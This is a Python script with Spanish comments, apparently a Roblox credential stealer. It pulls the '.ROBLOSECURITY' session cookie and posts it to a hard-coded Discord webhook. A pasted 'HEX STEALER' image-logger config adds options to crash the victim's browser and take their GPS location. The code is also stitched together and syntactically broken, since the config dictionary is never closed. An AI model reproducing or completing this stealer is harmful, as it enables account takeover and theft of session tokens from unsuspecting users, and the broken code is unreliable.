import requests
from urllib import parse
from http.server import BaseHTTPRequestHandler
from http.cookies import SimpleCookie

# Simulación de cookies obtenidas (normalmente sería del navegador o del servidor HTTP)
cookie_header = "cookie_name=value1; another_cookie=value2"

# Parseamos las cookies desde el header simulado
cookie = SimpleCookie()
cookie.load(cookie_header)

# Elige el nombre de la cookie que quieres obtener
cookie_name = ".ROBLOSECURITY"

# Extrae el valor de la cookie específica
cookie_value = cookie[cookie_name].value if cookie_name in cookie else None

# Configura la URL del webhook de Discord
webhook_url = 'https://discord.com/api/webhooks/1279705139581685781/VjDVjrZmdfJ3e7Wny2ZpHzK7TDHHtKkaTR7ptLFK4-SqudMqTKQdwrPjAqqE3i7SZQZu'

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1279705139581685781/VjDVjrZmdfJ3e7Wny2ZpHzK7TDHHtKkaTR7ptLFK4-SqudMqTKQdwrPjAqqE3i7SZQZu",
    "image": "https://i.imgur.com/UTwSor8.jpeg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "HEX STEALER", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "Here's the information that you ask for.", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },


# Si encontramos el valor de la cookie, lo enviamos a Discord
if cookie_value:
    data = {
        "content": f"El valor de la cookie '{cookie_name}' es: {cookie_value}"
    }

    # Envía el mensaje a Discord
    response = requests.post(webhook_url, json=data)

    # Verifica si el mensaje fue enviado correctamente
    if response.status_code == 204:
        print("Mensaje enviado exitosamente.")
    else:
        print(f"Error al enviar el mensaje. Código de estado: {response.status_code}")
else:
    print(f"La cookie '{cookie_name}' no se encontró.")
